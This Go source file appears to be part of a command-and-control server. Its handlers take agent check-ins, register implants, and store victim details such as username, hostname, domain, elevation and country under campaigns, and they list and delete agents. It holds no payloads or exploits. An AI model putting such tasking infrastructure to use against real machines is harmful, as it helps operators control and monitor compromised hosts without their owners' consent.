package server

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"time"
	"fmt"

	"github.com/go-chi/chi/v5"

	"ldrserver/internal/database"
	"ldrserver/internal/parser"
	"ldrserver/internal/utils"
	"ldrserver/internal/ws"
)

func (s *Server) HandleAgentCheckin(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()


	body, err := io.ReadAll(r.Body)
	if err != nil {
		utils.Return400(w, "failed reading request body")
		return
	}

	reader := parser.NewReader(bytes.NewReader(body))
	code, agentID := reader.GetCodeAndAgentID()
	if reader.Err() != nil {
		utils.Return400(w, "failed parsing request")
		return
	}
	fmt.Printf("[+] Agent Checked in %s\n", agentID)

	switch code {
	case CODE_CHECK_IN:
		if _, err := s.DB.GetTasks(agentID); err != nil {
			utils.Return500(w, "failed getting tasks")
			return
		}
		pw := parser.NewWriter()
		pw.Write4(TASK_NO_TASK)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(pw.Bytes())
		fmt.Println("[*] Sending back no task")
	case CODE_REGISTER:
		agent, err := reader.ParseRegister(agentID)
		if err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		if err := s.DB.InsertAgent(agent); err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		s.WS.Broadcast(ws.EventAgentNew, map[string]interface{}{
			"campaign_id": agent.CampaignID,
			"agent": database.Agent{
				UUID:     agent.AgentID,
				Username: agent.Username,
				Hostname: agent.Hostname,
				Domain:   agent.Domain,
				Arch:     agent.Arch,
				IsElev:   agent.IsElev,
				Country:  agent.Country,
				LastSeen: time.Now().UTC().Format("2006-01-02 15:04:05"),
			},
		})
		w.WriteHeader(http.StatusOK)
		return

	default:
		return
	}
}


func (s *Server) GetAgentInfo(w http.ResponseWriter,r *http.Request) {
	campaignId := chi.URLParam(r, "id")
	agentId    := chi.URLParam(r, "agentid")

	info, err := s.DB.GetSingleAgentInfo(campaignId, agentId)
	if err != nil {
		utils.Return500(w, "error retreiving agent info")
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(info)
}

func (s *Server) GetAgents(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	agents, err := s.DB.GetAgents(id)
	if err != nil {
		utils.Return500(w, "failed getting agents from db")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

func (s *Server) DeleteAgent(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if err := s.DB.DeleteAgent(id); err != nil {
		utils.Return500(w, "Failed Deleting Agent")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"msg": "Succesfully deleted agent"})
	return
}

